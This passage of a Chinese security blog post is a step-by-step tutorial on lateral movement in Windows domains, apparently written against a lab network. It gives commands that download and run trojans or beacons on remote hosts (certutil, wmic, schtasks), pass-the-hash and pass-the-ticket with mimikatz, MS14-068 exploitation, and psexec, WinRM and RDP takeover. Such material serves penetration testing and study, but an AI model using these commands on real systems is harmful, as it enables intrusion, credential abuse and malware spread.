@@ -1,0 +1,674 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="BigCircle">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="内网横向移动文件传输当我们拿下域内某台机器时，需要以此机器为跳板继续渗透域内其他的机器。此时可能就需要从这台跳板机中获取文件（木马等），此时有以下几种方法可以让目标机器从跳板机上获取文件  建立连接使用下面提到的IPC连接建立连接：12net use \\ip\ipc$ &quot;password&quot; &#x2F;user:[domain]\usernamecopy \\ip\path paylo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网横向移动">
+<meta property="og:url" content="http://example.com/cllaubo0k000kysut2zg5bsc1/index.html">
+<meta property="og:site_name" content="BigCircle-sec&#39;s Blog">
+<meta property="og:description" content="内网横向移动文件传输当我们拿下域内某台机器时，需要以此机器为跳板继续渗透域内其他的机器。此时可能就需要从这台跳板机中获取文件（木马等），此时有以下几种方法可以让目标机器从跳板机上获取文件  建立连接使用下面提到的IPC连接建立连接：12net use \\ip\ipc$ &quot;password&quot; &#x2F;user:[domain]\usernamecopy \\ip\path paylo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666023126521-004130ce-9266-45be-b580-c3a340881f13.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666023117250-803bfc94-adad-4738-abe6-9945f88e84d4.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666023069722-a8992d1a-35c7-4226-b482-c8a47c6e6287.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666045577335-4c7c3853-8be2-449a-b95c-8c0a6df73b89.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1661952471796-80a2802e-042a-483f-9798-82e655633a26.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663069985190-4592aa25-8039-4728-902c-92e7deb5aae3.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663070301798-d7e49ff9-7385-47b0-ad6c-bb90677b560d.jpeg">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663070340949-216ef551-d7cc-4a29-834e-0e82ae3e4892.jpeg">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663070386528-caac260b-53eb-49fd-8aa7-58a9775d9cc0.jpeg">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663070441290-4dcc20b3-1566-4c03-8530-085db1d6b0f3.jpeg">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666021249191-fd2f7c98-17e8-4b7e-ada8-54f48037e14a.png">
+<meta property="article:published_time" content="2023-08-13T16:48:09.684Z">
+<meta property="article:modified_time" content="2023-08-14T12:17:23.418Z">
+<meta property="article:author" content="BigCircle">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666023126521-004130ce-9266-45be-b580-c3a340881f13.png">
+  
+  
+  
+  <title>内网横向移动 - BigCircle-sec&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>BigCircle-sec&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网横向移动"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          86 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内网横向移动</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h1><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>当我们拿下域内某台机器时，需要以此机器为跳板继续渗透域内其他的机器。此时可能就需要从这台跳板机中获取文件（木马等），此时有以下几种方法可以让目标机器从跳板机上获取文件</p>
+<ol>
+<li>建立连接<br>使用下面提到的IPC连接<br>建立连接：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\ip\ipc$ &quot;password&quot; /user:[domain]\username<br><span class="hljs-built_in">copy</span> \\ip\<span class="hljs-built_in">path</span> payload.exe(先是跳板机的木马地址 后是木马在目标机器保存的位置)<br></code></pre></td></tr></table></figure></li>
+<li>搭建匿名smb服务器<br>搭建过程见<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/405303912">https://zhuanlan.zhihu.com/p/405303912</a><br>建立连接后可以直接用下面的命令即可从跳板机下载木马<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">copy</span> \\ip\<span class="hljs-built_in">path</span> payload.exe(先是跳板机的木马地址 后是木马在目标机器保存的位置)<br></code></pre></td></tr></table></figure></li>
+<li>Windows自带命令（适用于开启了http服务）</li>
+</ol>
+<ul>
+<li>certutil -urlcache split -f <a href="http://ip:port/shell.exe">http://ip:port/shell.exe</a> C:\shell.exe</li>
+<li>bitsadmin &#x2F;transfer test <a href="http://ip:port/shell.exe">http://ip:port/shell.exe</a> C:\shell.exe</li>
+<li>powershell: (New-Object Net.WebClient).DownloadFIle(‘<a href="http://ip:port/shell.exe','C:\shell.exe">http://ip:port/shell.exe&#39;,&#39;C:\shell.exe</a>‘)</li>
+</ul>
+<h2 id="ipc横向移动"><a href="#ipc横向移动" class="headerlink" title="ipc横向移动"></a>ipc横向移动</h2><p>通过前期信息收集得到的账号密码，内网主机ip信息，进行ipc连接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net use \\ip\ipc$ &quot;password&quot; /user:[domain\]username<br></code></pre></td></tr></table></figure>
+<p>建立连接后即可使用copy命令（copy beacon.exe \192.168.3.21\c$）将木马上传过去。此时需要注意的是可能会出现拒绝访问的错误，这是因为连接的用户权限不够导致的，尝试用administrator用户连接即可成功上传<br>上传之后根据操作系统不同使用不同的方式运行木马</p>
+<ul>
+<li>at (&lt; Windows2012): </li>
+<li>schtasks (&gt;&#x3D;Windows2012)</li>
+</ul>
+<h2 id="wmi横向移动-135端口"><a href="#wmi横向移动-135端口" class="headerlink" title="wmi横向移动(135端口)"></a>wmi横向移动(135端口)</h2><ol>
+<li>wmic (系统自带，但无回显，可以创建进程)<br>由于无回显，所以只能使用命令下载跳板机上的木马，再执行此木马使得cs上线<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wmic /node:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">32</span> /user:administrator /password:admin!@#<span class="hljs-number">45</span> process <span class="hljs-keyword">call</span> create &quot;<span class="hljs-built_in">cmd</span>.exe /c certutil -urlcache -split -f http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">31</span>/beacon.exe c:/beacon.exe&quot;<br>wmic /node:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">32</span>/user:administrator /password:admin!@#<span class="hljs-number">45</span> process <span class="hljs-keyword">call</span> create &quot;<span class="hljs-built_in">cmd</span>.exe c:/beacon.exe&quot;<br></code></pre></td></tr></table></figure></li>
+<li>cscript（需要上传文件，交互式）<br>需要上传wmiexec.vbs<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">需要上传wmiexec.vbs<br></code></pre></td></tr></table></figure>
+由于会将192.168.3.21的cmd反弹回来，所以在cs上执行可能会卡住，无法利用。<br>解决方法有两种，一是利用cs的远程桌面功能直接远控跳板机，在图形界面上操作反弹回来的192.168.3.21的cmd<br>二是将cs的权限移交给msf，在msf上使用上述命令</li>
+<li>wmiexec(impacket工具包)<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wmiexec ./administrator:admin!@#<span class="hljs-number">45</span>@<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">32</span> &quot;whoami&quot;<br>wmiexec -hashes :<span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c ./administrator@<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">32</span>&quot;whoami&quot;<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="SMB横向移动-445端口"><a href="#SMB横向移动-445端口" class="headerlink" title="SMB横向移动(445端口)"></a>SMB横向移动(445端口)</h2><ol>
+<li>psexec(pstools工具包)<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">psexec64</span> \\<span class="hljs-number">192.168.3.32</span> -u administrator -p admin!@<span class="hljs-comment">#45 -s cmd</span><br></code></pre></td></tr></table></figure></li>
+<li>psexec(impacket工具包)<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">psexec</span> -hashes :<span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c ./administrator@<span class="hljs-number">192.168.3.32</span><br></code></pre></td></tr></table></figure></li>
+<li>smbexec(impacket工具包)<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">smbexec</span> ./administrator:admin!@#<span class="hljs-number">45</span>@<span class="hljs-number">192.168.3.32</span><br><span class="hljs-attribute">smbexec</span> -hashes :<span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c god/administrator@<span class="hljs-number">192.168.3.32</span>s<br></code></pre></td></tr></table></figure></li>
+<li>service(需要先上传木马)<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">services -hashes :<span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c./administrator:@<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.32</span> <span class="hljs-built_in">create</span> -name <span class="hljs-built_in">shell</span> -display shellexec -path C:\Windows\System32\<span class="hljs-built_in">shell</span>.exe<br>services -hashes :<span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c./administrator:@<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.32</span> <span class="hljs-built_in">start</span> -name <span class="hljs-built_in">shell</span><br></code></pre></td></tr></table></figure></li>
+<li>smbclient<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">smbclient -L <span class="hljs-symbol">\\</span><span class="hljs-symbol">\\</span>10.10.156.76<span class="hljs-symbol">\\</span>  -U svc-admin 输入密码后列出所有smb共享<br>smbclient <span class="hljs-symbol">\\</span><span class="hljs-symbol">\\</span>10.10.156.76<span class="hljs-symbol">\\</span>backup -U svc-admin 连接backup共享（若通过上一步列出的共享列表中有backup则可以通过svc-admin的密码连接backup）<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>前三种方式都会返回一个cmd，需要cs配合msf进行使用，其中psexec通过smb连接  目标主机的ADMIN$共享，释放一个psexecsvc.exe的可执行文件，创建一个名为psexecsvc的服务执行此exe文件</p>
+<h2 id="pth横向移动"><a href="#pth横向移动" class="headerlink" title="pth横向移动"></a>pth横向移动</h2><p>pth即pass the hash 通过ntlm hash值横向移动</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz privilege::debug<br>mimikatz sekurlsa::pth /user:administrator /domain:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">21</span>/ntlm:ccef208c6485269c20db2cad21734fe7<br>（此处会返回一个<span class="hljs-built_in">cmd</span>，下面的命令需要在返回的<span class="hljs-built_in">cmd</span>中执行。同时，正因为需要在返回的<span class="hljs-built_in">cmd</span>中进行操作，cs的beacon交互是无法进行相关操作的，所以需要使用steal_token pid进行进程劫持，或者使用cs的远程桌面功能，或者将cs移交msf）<br><span class="hljs-built_in">net</span> use \\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">21</span>\c$<br><span class="hljs-built_in">copy</span> beacon.exe \\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">21</span>\c$<br>#<span class="hljs-built_in">at</span> &lt; Windows2012<br><span class="hljs-built_in">at</span> \\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">21</span> <span class="hljs-number">15</span>:<span class="hljs-number">47</span> c:\beacon.exe （其中<span class="hljs-number">15</span>:<span class="hljs-number">47</span>为任务执行时间）<br>#schtasks &gt;=Windows2012<br>schtasks /create /s <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">32</span> /ru &quot;SYSTEM&quot;/tn beacon /sc DAILY /tr c:\beacon.exe /F #创beacon任务对应执行文件<br>schtasks /run /s <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">32</span>/tn beacon /i #运行beacon任务<br>schtasks /delete /s <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">21</span>/tn beacon /f#删除beacon任务<br></code></pre></td></tr></table></figure>
+
+<h2 id="ptt横向移动"><a href="#ptt横向移动" class="headerlink" title="ptt横向移动"></a>ptt横向移动</h2><ol>
+<li>MS14068 （webadmin权限即可）</li>
+</ol>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><ol>
+<li>如果再asreq阶段指定include-pac为false则再asres阶段返回的tgt中将不会有pac</li>
+<li>pac中虽然指定了校验和算法，但是可以更改校验和算法为md5，绕过校验和</li>
+</ol>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">whoami</span>/user 获取sid<br><span class="hljs-attribute">ms14</span>-<span class="hljs-number">068</span>.exe -u webadmin@god.org -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1218902331</span>-<span class="hljs-number">2157346161</span>-<span class="hljs-number">1782232778</span>-<span class="hljs-number">1132</span> -d <span class="hljs-number">192.168.3.21</span>-p admin!@#<span class="hljs-number">45</span>（-s sid -d dc_ip -p 明文密码 --rc4：在没有明文密码的情况下，通过NTLM Hash登录）<br><span class="hljs-attribute">klist</span> purge 清除原有凭证，防止干扰<br><span class="hljs-attribute">mimikatz</span> kerberos::ptc TGT_webadmin@god.org.ccache  将生成的tgt使用mimikatz导入内存，其中TGT_webadmin@god.org.ccache为tgt文件名<br><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.3.21</span>\c$<br><span class="hljs-attribute">copy</span> beacon.exe \\<span class="hljs-number">192.168.3.21</span>\c$<br><span class="hljs-comment">#at &lt; Windows2012</span><br><span class="hljs-attribute">at</span> \\<span class="hljs-number">192.168.3.21</span> <span class="hljs-number">15</span>:<span class="hljs-number">47</span> c:\beacon.exe （其中<span class="hljs-number">15</span>:<span class="hljs-number">47</span>为任务执行时间）<br><span class="hljs-comment">#schtasks &gt;=Windows2012</span><br><span class="hljs-attribute">schtasks</span> /create /s <span class="hljs-number">192.168.3.32</span> /ru <span class="hljs-string">&quot;SYSTEM&quot;</span>/tn beacon /sc DAILY /tr c:\beacon.exe /F #创beacon任务对应执行文件<br><span class="hljs-attribute">schtasks</span> /run /s <span class="hljs-number">192.168.3.32</span>/tn beacon /i #运行beacon任务<br><span class="hljs-attribute">schtasks</span> /delete /s <span class="hljs-number">192.168.3.21</span>/tn beacon /f#删除beacon任务<br></code></pre></td></tr></table></figure>
+<h2 id="winrm横向移动"><a href="#winrm横向移动" class="headerlink" title="winrm横向移动"></a>winrm横向移动</h2><p>WinRM代表Windows远程管理，是一种允许管理员远程执行系统管理任务的服务。默认端口为5985</p>
+<p>默认情况下支持Kerberos和NTLM身份验证以及基本身份验证。<br>移动条件：双方都启用的Winrm rs的服务</p>
+<p>使用此服务需要管理员级别凭据。<br>Windows 2008 以上版本默认自动状态，Windows Vista&#x2F;win7上必须手动启动；<br>Windows 2012之后的版本默认允许远程任意主机来管理。</p>
+<p>查看是否开启winrm：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell <span class="hljs-keyword">Get</span>-WmiObject -<span class="hljs-keyword">Class</span> win32_service | <span class="hljs-keyword">Where</span>-<span class="hljs-keyword">Object</span> &#123;$_.name -<span class="hljs-keyword">like</span> &quot;WinRM&quot;&#125;<br>或者<br><span class="hljs-keyword">Get</span>-WmiObject -<span class="hljs-keyword">Class</span> win32_service | <span class="hljs-keyword">Where</span>-<span class="hljs-keyword">Object</span> &#123;$_.name -<span class="hljs-keyword">like</span> &quot;WinRM&quot;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>开启winrm服务</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">winrm quickconfig 或 winrm quickconfig -<span class="hljs-selector-tag">q</span><br></code></pre></td></tr></table></figure>
+
+<p>执行命令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">winrs</span> -r:<span class="hljs-number">192.168.3.32</span> -u:<span class="hljs-number">192.168.3.32</span>\administrator -p:admin!@#<span class="hljs-number">45</span> <span class="hljs-string">&quot;whoami&quot;</span>(执行命令，非交互式)<br></code></pre></td></tr></table></figure>
+<p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666023126521-004130ce-9266-45be-b580-c3a340881f13.png" srcset="/img/loading.gif" lazyload><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666023117250-803bfc94-adad-4738-abe6-9945f88e84d4.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">winrs</span> -r:<span class="hljs-number">192.168.3.21</span> -u:god\administrator -p:admin!@#<span class="hljs-number">45</span> <span class="hljs-string">&quot;cmd&quot;</span>(返回cmd，交互式)<br></code></pre></td></tr></table></figure>
+<p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666023069722-a8992d1a-35c7-4226-b482-c8a47c6e6287.png" srcset="/img/loading.gif" lazyload><br>或依次执行下面的命令也可以返回一个交互式shell</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">$User=&quot;god\administrator&quot;<br>$Password=ConvertTo-SecureString -String &quot;Admin12345&quot; -AsPlainText -Force<br>$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password<br>New-PSSession -Name WinRM1 -ComputerName <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">21</span> -Credential $Cred -Port <span class="hljs-number">5985</span><br>Enter-PSSession -Name WinRM1<br></code></pre></td></tr></table></figure>
+<p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666045577335-4c7c3853-8be2-449a-b95c-8c0a6df73b89.png" srcset="/img/loading.gif" lazyload></p>
+<p>若遇到下面的报错信息：<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1661952471796-80a2802e-042a-483f-9798-82e655633a26.png" srcset="/img/loading.gif" lazyload><br>则设置winrm信任所有主机即可</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">Set</span>-Item WSMan:localhost\Client\TrustedHosts -Value &#x27;*&#x27;<br></code></pre></td></tr></table></figure>
+<p>查看信任主机列表：</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-built_in">Item</span> <span class="hljs-variable">WSMan</span><span class="hljs-operator">:</span>\<span class="hljs-variable">localhost</span>\<span class="hljs-variable">Client</span>\<span class="hljs-variable">TrustedHosts</span><br></code></pre></td></tr></table></figure>
+<h2 id="RDP横向移动"><a href="#RDP横向移动" class="headerlink" title="RDP横向移动"></a>RDP横向移动</h2><p>远程桌面服务 支持明文及HASH连接<br>条件：对方开启RDP服务 远程桌面（开放3389端口）<br>明文连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mstsc /console /v:192.168.3.32 /admin<br></code></pre></td></tr></table></figure>
+<p>HASH连接：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz privilege::debug<br>mimikatz sekurlsa::pth <span class="hljs-regexp">/user:administrator /</span>domain:<span class="hljs-number">192.168</span>.<span class="hljs-number">3.32</span> <span class="hljs-regexp">/ntlm:518b98ad4178a53695dc997aa02d455c &quot;/</span>run:mstsc /restrictedadmin<span class="hljs-string">&quot;\</span><br></code></pre></td></tr></table></figure>
+<p>设置开启rdp 3389端口 :</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></code></pre></td></tr></table></figure>
+<p>通过代理连接：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> rdesktop <span class="hljs-number">192.168.52.141</span><br></code></pre></td></tr></table></figure>
+<p>除此之外还可以尝试获取机器中存储的rdp凭据，通过cmdkey &#x2F;list可以获取当前保存的凭据<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663069985190-4592aa25-8039-4728-902c-92e7deb5aae3.png" srcset="/img/loading.gif" lazyload></p>
+<p>获取rdp凭据的方式有如下几种：</p>
